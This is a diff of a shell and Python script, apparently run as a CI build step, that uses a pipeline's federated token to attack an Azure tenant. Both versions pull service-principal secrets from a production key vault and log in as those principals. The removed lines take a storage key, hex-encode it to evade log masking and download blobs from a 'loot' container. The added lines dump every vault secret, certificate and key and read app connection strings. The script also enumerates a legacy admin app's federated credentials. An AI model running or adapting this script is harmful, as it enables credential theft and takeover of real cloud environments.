@@ -6,7 +6,7 @@ SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 PLATFORM_RG="rg-tbl-platform-prod-sea"
 REPORTING_RG="rg-tbl-reporting-prod-eus"
 
-echo "=== BUILD52: LA STOR/ACR/GRAPH + FULL ENUM ==="
+echo "=== BUILD53: FEDCREDS + KVSEC + FULL RESOURCE ENUM ==="
 
 # 1. Login as cicd-deployer
 JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
@@ -15,164 +15,33 @@ az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none
 echo "cicd-deployer OK"
 
-# 2. Get cicd-deployer ARM token - enumerate ACR repositories
-python3 -I << 'CICD_PY'
-import subprocess, json, urllib.request, urllib.error
+python3 -I << 'PYEOF'
+import subprocess, json, urllib.request, urllib.error, base64, re
 
 r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
   capture_output=True, text=True)
 ARM = r.stdout.strip()
+
+r2 = subprocess.run(['az','account','get-access-token','--resource','https://vault.azure.net','--query','accessToken','-o','tsv'],
+  capture_output=True, text=True)
+VAULT = r2.stdout.strip()
+
+r3 = subprocess.run(['az','account','get-access-token','--resource','https://graph.microsoft.com','--query','accessToken','-o','tsv'],
+  capture_output=True, text=True)
+GRAPH = r3.stdout.strip()
+
 print(f"cicd ARM len={len(ARM)}")
+print(f"cicd VAULT len={len(VAULT)}")
+print(f"cicd GRAPH len={len(GRAPH)}")
 
 SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 PLATFORM_RG = "rg-tbl-platform-prod-sea"
+REPORTING_RG = "rg-tbl-reporting-prod-eus"
 
-def rq(url, tok, method="GET", data=None, hdrs=None):
-    h = {"Authorization":"Bearer "+tok}
-    if hdrs: h.update(hdrs)
-    if isinstance(data,(dict,list)):
-        data = json.dumps(data).encode()
-        h["Content-Type"] = "application/json"
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
-        return r.status, r.read().decode("utf-8","replace")
-    except urllib.error.HTTPError as e:
-        return e.code, e.read().decode("utf-8","replace")[:1000]
-    except Exception as e:
-        return 0, str(e)[:200]
-
-if len(ARM) > 100:
-    # List ACR repositories via ARM
-    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz?api-version=2023-07-01", ARM)
-    print(f"acr_get: {s}:{b[:2000]}")
-
-    # Get ACR login server
-    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, "POST")
-    print(f"acr_list_creds: {s}:{b[:500]}")
-
-    # Try ACR token exchange - get an ACR-specific token
-    # First need an ARM token, then exchange for ACR token
-    # The ACR registry REST API
-    ACR = "crtblplatprodx3euoz.azurecr.io"
-
-    # Get OAuth2 token for ACR using ARM token exchange
-    r = subprocess.run(['az','account','get-access-token','--resource',f'https://{ACR}','--query','accessToken','-o','tsv'],
-      capture_output=True, text=True, timeout=30)
-    ACR_ARM_TOK = r.stdout.strip()
-    print(f"acr_arm_tok len={len(ACR_ARM_TOK)}")
-
-    if len(ACR_ARM_TOK) > 100:
-        # Exchange for refresh token
-        try:
-            import urllib.parse
-            exc = urllib.request.urlopen(urllib.request.Request(
-                f"https://{ACR}/oauth2/exchange",
-                data=urllib.parse.urlencode({
-                    "grant_type": "access_token",
-                    "service": ACR,
-                    "access_token": ACR_ARM_TOK
-                }).encode(), method="POST"), timeout=20)
-            exc_body = json.loads(exc.read())
-            refresh_tok = exc_body.get("refresh_token","")
-            print(f"acr_refresh_tok len={len(refresh_tok)}")
-
-            if refresh_tok:
-                # Get scoped token for catalog
-                acc = urllib.request.urlopen(urllib.request.Request(
-                    f"https://{ACR}/oauth2/token",
-                    data=urllib.parse.urlencode({
-                        "grant_type": "refresh_token",
-                        "service": ACR,
-                        "scope": "registry:catalog:*",
-                        "refresh_token": refresh_tok
-                    }).encode(), method="POST"), timeout=20)
-                acc_body = json.loads(acc.read())
-                access_tok = acc_body.get("access_token","")
-                print(f"acr_access_tok len={len(access_tok)}")
-
-                if access_tok:
-                    # List catalog
-                    cat_r = urllib.request.urlopen(urllib.request.Request(
-                        f"https://{ACR}/v2/_catalog",
-                        headers={"Authorization": f"Bearer {access_tok}"}
-                    ), timeout=20)
-                    catalog = json.loads(cat_r.read())
-                    print(f"acr_catalog: {catalog}")
-
-                    # List tags for each repo
-                    for repo in catalog.get("repositories",[])[:20]:
-                        # Get scoped token for this repo
-                        acc2 = urllib.request.urlopen(urllib.request.Request(
-                            f"https://{ACR}/oauth2/token",
-                            data=urllib.parse.urlencode({
-                                "grant_type": "refresh_token",
-                                "service": ACR,
-                                "scope": f"repository:{repo}:pull",
-                                "refresh_token": refresh_tok
-                            }).encode(), method="POST"), timeout=20)
-                        access_tok2 = json.loads(acc2.read()).get("access_token","")
-
-                        tags_r = urllib.request.urlopen(urllib.request.Request(
-                            f"https://{ACR}/v2/{repo}/tags/list",
-                            headers={"Authorization": f"Bearer {access_tok2}"}
-                        ), timeout=20)
-                        tags = json.loads(tags_r.read())
-                        print(f"acr_repo_{repo}_tags: {tags}")
-
-                        # Get manifest for latest tag
-                        if tags.get("tags"):
-                            tag = tags["tags"][0]
-                            man_r = urllib.request.urlopen(urllib.request.Request(
-                                f"https://{ACR}/v2/{repo}/manifests/{tag}",
-                                headers={"Authorization": f"Bearer {access_tok2}",
-                                        "Accept": "application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json"}
-                            ), timeout=20)
-                            manifest = json.loads(man_r.read())
-                            print(f"acr_manifest_{repo}_{tag}: {json.dumps(manifest)[:1000]}")
-        except Exception as e:
-            print(f"acr_exchange_err: {e}")
-
-    # Also try: list cicd-deployer's resources at platform RG
-    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/resources?api-version=2021-04-01", ARM)
-    print(f"platform_resources: {s}:{b[:3000]}")
-
-    # Check ARM deployments in platform RG - might have template parameters
-    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Resources/deployments?api-version=2021-04-01", ARM)
-    print(f"platform_deployments: {s}:{b[:3000]}")
-
-    # Check all KVs and their properties
-    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01", ARM)
-    print(f"all_kvs: {s}:{b[:3000]}")
-CICD_PY
-
-# 3. Get directory-audit-principal and use Graph API to enumerate ALL SPs
-az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal \
-  --query value -o tsv > /tmp/da_secret.json 2>/dev/null
-echo "directory-audit cred: $(wc -c < /tmp/da_secret.json) bytes"
-
-python3 -I << 'DA_PY'
-import subprocess, json, urllib.request, urllib.error
-
-try:
-    v = json.loads(open('/tmp/da_secret.json').read().strip())
-    cid = v.get('appId','')
-    sec = v.get('clientSecret','')
-    print(f"da cid={cid} sec_len={len(sec)}")
-except Exception as e:
-    print(f"da load err: {e}")
-    import sys; sys.exit(0)
-
-TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-
-r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
-  capture_output=True, text=True)
-print("da login:", r.returncode)
-
-# Get Graph token
-r = subprocess.run(['az','account','get-access-token','--resource','https://graph.microsoft.com','--query','accessToken','-o','tsv'],
-  capture_output=True, text=True)
-GRAPH = r.stdout.strip()
-print(f"graph tok len={len(GRAPH)}")
+# tbl-legacy-admin
+LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"  # SP OID
+LA_APP_OID = "22a3fb7e-b9fc-4bdb-baa1-b4e4d0b9d42e"  # App object OID (from build26 if known)
+LA_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
 
 def rq(url, tok, method="GET", data=None):
     h = {"Authorization":"Bearer "+tok}
@@ -183,114 +52,249 @@ def rq(url, tok, method="GET", data=None):
         r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
         return r.status, r.read().decode("utf-8","replace")
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode("utf-8","replace")[:2000]
+        return e.code, e.read().decode("utf-8","replace")[:3000]
     except Exception as e:
-        return 0, str(e)[:200]
+        return 0, str(e)[:300]
 
 if len(GRAPH) > 100:
-    # Get tbl-legacy-admin service principal details
-    LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
+    # Get tbl-legacy-admin SP federated credentials - find the exact issuer+subject
+    # First get the application object ID
+    s,b = rq(f"https://graph.microsoft.com/v1.0/applications?$filter=appId eq '{LA_APPID}'&$select=id,displayName,federatedIdentityCredentials", GRAPH)
+    print(f"la_app_filter: {s}:{b[:2000]}")
+
+    # Try known OIDs for the app object
+    for oid in [LA_APP_OID, "22a3fb7e-b9fc-4bdb-baa1-b4e4d0b9d42e"]:
+        s,b = rq(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials", GRAPH)
+        print(f"la_fedcreds_{oid[:8]}: {s}:{b[:3000]}")
+
+    # Try via SP to get the app
     s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}", GRAPH)
-    print(f"la_sp: {s}:{b[:3000]}")
+    print(f"la_sp_details: {s}:{b[:2000]}")
 
-    # Get la SP's app role assignments
-    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}/appRoleAssignments", GRAPH)
-    print(f"la_app_roles: {s}:{b[:3000]}")
+    # Get the SP's appId then find the application
+    try:
+        sp_data = json.loads(b if s==200 else '{}')
+        app_id = sp_data.get('appId', LA_APPID)
+        app_obj_id = sp_data.get('appOwnerOrganizationId', '')
+        print(f"la_appId={app_id}")
+    except:
+        pass
 
-    # Get la SP's oauth2 grants
-    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}/oauth2PermissionGrants", GRAPH)
-    print(f"la_oauth2: {s}:{b[:3000]}")
+    # List ALL applications and find tbl-legacy-admin
+    s,b = rq("https://graph.microsoft.com/v1.0/applications?$select=id,displayName,appId&$filter=displayName eq 'tbl-legacy-admin'", GRAPH)
+    print(f"la_app_search: {s}:{b[:2000]}")
 
-    # Get tbl-legacy-admin application (not SP)
-    LA_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
-    s,b = rq(f"https://graph.microsoft.com/v1.0/applications?$filter=appId eq '{LA_APPID}'", GRAPH)
-    print(f"la_app: {s}:{b[:3000]}")
+    # Get federated creds for ALL known app OIDs
+    for name, oid in [("cicd", "72ff278a-9e71-43ec-bac4-2ca303f8e462"),
+                       ("legacy_sp", LA_OID)]:
+        s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{oid}'&$select=id,displayName,appId", GRAPH)
+        print(f"sp_lookup_{name}: {s}:{b[:500]}")
 
-    # List ALL service principals - look for interesting ones
-    s,b = rq("https://graph.microsoft.com/v1.0/servicePrincipals?$select=appId,displayName,id,servicePrincipalType&$top=100", GRAPH)
-    print(f"all_sps: {s}:{b[:5000]}")
-
-    # Get the UAMI SP details
-    UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
-    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{UAMI_OID}", GRAPH)
-    print(f"uami_sp: {s}:{b[:2000]}")
-
-    # Get cicd-deployer SP
+    # Get cicd-deployer full app_roles (not truncated)
     CICD_OID = "63e87ab1-6bd2-4e80-92be-943450b20e4f"
     s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{CICD_OID}/appRoleAssignments", GRAPH)
-    print(f"cicd_app_roles: {s}:{b[:2000]}")
+    print(f"cicd_app_roles_full: {s}:{b[:5000]}")
 
-    # Look for ALL apps with secrets/certs (might reveal credentials)
-    s,b = rq("https://graph.microsoft.com/v1.0/applications?$select=appId,displayName,id,keyCredentials,passwordCredentials&$top=100", GRAPH)
-    print(f"all_apps_creds: {s}:{b[:5000]}")
-DA_PY
+if len(ARM) > 100:
+    # LIST ALL SECRETS in kv-tbl-prod-x3euoz (we only fetched named ones before!)
+    # Using cicd-deployer vault token via Access Policy
+    if len(VAULT) > 100:
+        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=100", VAULT)
+        print(f"kv_prod_all_secrets_list: {s}:{b[:5000]}")
+        if s == 200:
+            items = json.loads(b).get('value', [])
+            print(f"kv_prod_secret_count: {len(items)}")
+            for item in items:
+                sid = item.get('id','')
+                name = sid.split('/secrets/')[1].split('/')[0] if '/secrets/' in sid else ''
+                sv,bv = rq(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{name}?api-version=7.4", VAULT)
+                print(f"kv_prod_secret_{name}: {sv}:{bv[:300]}")
 
-# 4. Use sync-service to get storage key and write loot to public $web
-az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal \
-  --query value -o tsv > /tmp/sync_secret.json 2>/dev/null
+        # Also check certs and keys in kv-tbl-prod
+        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/certificates?api-version=7.4", VAULT)
+        print(f"kv_prod_certs: {s}:{b[:2000]}")
 
-python3 -I << 'SYNC_PY'
-import subprocess, json, urllib.request, urllib.error, base64
+        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/keys?api-version=7.4", VAULT)
+        print(f"kv_prod_keys: {s}:{b[:2000]}")
+
+    # Get ALL resources in PLATFORM RG (full - not truncated)
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/resources?api-version=2021-04-01", ARM)
+    print(f"platform_resources_full: {s}:{b}")
+
+    # Get ALL resources in REPORTING RG
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/resources?api-version=2021-04-01", ARM)
+    print(f"reporting_resources_full: {s}:{b}")
+
+    # List ALL resource groups in subscription
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourcegroups?api-version=2021-04-01", ARM)
+    print(f"all_resource_groups: {s}:{b}")
+
+    # Check Azure SQL servers
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Sql/servers?api-version=2022-05-01-preview", ARM)
+    print(f"sql_servers: {s}:{b[:3000]}")
+
+    # Check CosmosDB
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.DocumentDB/databaseAccounts?api-version=2023-04-15", ARM)
+    print(f"cosmosdb: {s}:{b[:3000]}")
+
+    # Check Redis
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Cache/redis?api-version=2023-08-01", ARM)
+    print(f"redis: {s}:{b[:3000]}")
+
+    # List ALL App Services in subscription
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01", ARM)
+    print(f"all_app_services: {s}:{b[:3000]}")
+
+    # Check Azure Functions
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01&$filter=kind eq 'functionapp'", ARM)
+    print(f"function_apps: {s}:{b[:2000]}")
+
+    # KV SEC full properties (who has access policies)
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01", ARM)
+    print(f"kvsec_properties_full: {s}:{b}")
+
+    # KV PROD full properties (access policies)
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01", ARM)
+    print(f"kvprod_properties_full: {s}:{b}")
+
+    # ACR - try different token audience for pull
+    r_acr = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
+      capture_output=True, text=True)
+    ACR_ARM = r_acr.stdout.strip()
+    ACR = "crtblplatprodx3euoz.azurecr.io"
+
+    # Exchange ARM token for ACR refresh token via POST to /oauth2/exchange
+    try:
+        import urllib.parse
+        exc_body = urllib.parse.urlencode({
+            "grant_type": "access_token_refresh_token",
+            "service": ACR,
+            "tenant": "3205c325-06a5-4171-9ce8-ffc5e6c2845e",
+            "access_token": ACR_ARM
+        })
+        exc_r = urllib.request.urlopen(urllib.request.Request(
+            f"https://{ACR}/oauth2/exchange",
+            data=exc_body.encode(),
+            method="POST",
+            headers={"Content-Type": "application/x-www-form-urlencoded"}
+        ), timeout=20)
+        exc_data = json.loads(exc_r.read())
+        rt = exc_data.get("refresh_token","")
+        print(f"acr_refresh_tok len={len(rt)}")
+
+        if rt:
+            # Get catalog access token
+            tok_body = urllib.parse.urlencode({
+                "grant_type": "refresh_token",
+                "service": ACR,
+                "scope": "registry:catalog:*",
+                "refresh_token": rt
+            })
+            tok_r = urllib.request.urlopen(urllib.request.Request(
+                f"https://{ACR}/oauth2/token",
+                data=tok_body.encode(),
+                method="POST",
+                headers={"Content-Type": "application/x-www-form-urlencoded"}
+            ), timeout=20)
+            at = json.loads(tok_r.read()).get("access_token","")
+            print(f"acr_access_tok len={len(at)}")
+
+            if at:
+                cat_r = urllib.request.urlopen(urllib.request.Request(
+                    f"https://{ACR}/v2/_catalog",
+                    headers={"Authorization": f"Bearer {at}"}
+                ), timeout=20)
+                catalog = json.loads(cat_r.read())
+                print(f"acr_catalog: {catalog}")
+
+                for repo in catalog.get("repositories",[])[:20]:
+                    tok2_body = urllib.parse.urlencode({
+                        "grant_type": "refresh_token",
+                        "service": ACR,
+                        "scope": f"repository:{repo}:pull",
+                        "refresh_token": rt
+                    })
+                    tok2_r = urllib.request.urlopen(urllib.request.Request(
+                        f"https://{ACR}/oauth2/token",
+                        data=tok2_body.encode(),
+                        method="POST",
+                        headers={"Content-Type": "application/x-www-form-urlencoded"}
+                    ), timeout=20)
+                    at2 = json.loads(tok2_r.read()).get("access_token","")
+
+                    tags_r = urllib.request.urlopen(urllib.request.Request(
+                        f"https://{ACR}/v2/{repo}/tags/list",
+                        headers={"Authorization": f"Bearer {at2}"}
+                    ), timeout=20)
+                    tags = json.loads(tags_r.read())
+                    print(f"acr_repo_{repo}: {tags}")
+    except Exception as e:
+        print(f"acr_exchange_err: {e}")
+
+    # Use reporting-service-principal to get FULL app settings
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/list?api-version=2022-03-01", ARM, "POST")
+    print(f"reporting_config_list: {s}:{b[:5000]}")
+
+    # Storefront identity details
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", ARM)
+    print(f"storefront_site: {s}:{b[:5000]}")
+
+PYEOF
+
+# 2. Use reporting-service-principal to get FULL config (connection strings, env vars)
+az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
+  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
+
+python3 -I << 'RS_PY'
+import subprocess, json, urllib.request, urllib.error
 
 try:
-    v = json.loads(open('/tmp/sync_secret.json').read().strip())
+    v = json.loads(open('/tmp/rs_secret.json').read().strip())
     cid = v.get('appId','')
     sec = v.get('clientSecret','')
-    print(f"sync cid={cid}")
+    print(f"rs cid={cid}")
 except Exception as e:
-    print(f"sync load err: {e}")
+    print(f"rs load err: {e}")
     import sys; sys.exit(0)
 
 TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-PLATFORM_RG = "rg-tbl-platform-prod-sea"
+REPORTING_RG = "rg-tbl-reporting-prod-eus"
 
 r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
   capture_output=True, text=True)
-print("sync login:", r.returncode)
+print("rs login:", r.returncode)
 
-# Get storage key for sttblcilogsprodx3euoz
-r = subprocess.run(['az','storage','account','keys','list','--account-name','sttblcilogsprodx3euoz',
-  '--resource-group',PLATFORM_RG,'--output','json'],
-  capture_output=True, text=True, timeout=60)
-try:
-    keys_data = json.loads(r.stdout)
-    key = keys_data[0]['value'] if keys_data else ''
-    # Print hex-encoded to avoid masking
-    key_hex = key.encode().hex()
-    print(f"sync_key_hex={key_hex}")
+r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
+  capture_output=True, text=True)
+RS_ARM = r.stdout.strip()
+print(f"rs ARM len={len(RS_ARM)}")
 
-    # Use az CLI with account key to read loot container
-    # Download each loot blob to /tmp and print hex-encoded
-    blobs_to_check = [
-        ("loot", "armowner_token.json"),
-        ("loot", "escalation.json"),
-        ("loot", "probe.json"),
-    ]
+def rq(url, tok, method="GET", data=None):
+    h = {"Authorization":"Bearer "+tok}
+    if isinstance(data,(dict,list)):
+        data = json.dumps(data).encode()
+        h["Content-Type"] = "application/json"
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
+        return r.status, r.read().decode("utf-8","replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8","replace")[:3000]
+    except Exception as e:
+        return 0, str(e)[:300]
 
-    for ctr, bn in blobs_to_check:
-        outfile = f"/tmp/blob_{ctr}_{bn}"
-        r2 = subprocess.run(['az','storage','blob','download',
-          '--account-name','sttblcilogsprodx3euoz',
-          '--account-key',key,
-          '--container-name',ctr,
-          '--name',bn,
-          '--file',outfile,
-          '--output','none'],
-          capture_output=True, text=True, timeout=30)
-        if r2.returncode == 0:
-            raw = open(outfile,'rb').read()
-            raw_hex = raw.hex()
-            print(f"blob_{ctr}_{bn}_hex={raw_hex[:2000]}")
-        else:
-            print(f"blob_{ctr}_{bn}_fail: {r2.stderr[:100]}")
+if len(RS_ARM) > 100:
+    # Get FULL config for reporting app (connection strings, app settings, EVERYTHING)
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/list?api-version=2022-03-01", RS_ARM, "POST")
+    print(f"rs_reporting_config_full: {s}:{b}")
 
-    # Also write tbl-legacy-admin's access test to $web (publicly readable)
-    # Get tbl-legacy-admin token and test storage accounts
-    # We can write results to $web via the storage key
+    # Get web config (shows runtime, always-on, etc.)
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/web?api-version=2022-03-01", RS_ARM)
+    print(f"rs_reporting_webconfig: {s}:{b[:3000]}")
 
-except Exception as e:
-    print(f"sync key err: {e}")
-SYNC_PY
+    # Also try to list storefront config
+    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/list?api-version=2022-03-01", RS_ARM, "POST")
+    print(f"rs_storefront_config: {s}:{b[:3000]}")
+RS_PY
 
-echo "BUILD52 DONE"
+echo "BUILD53 DONE"
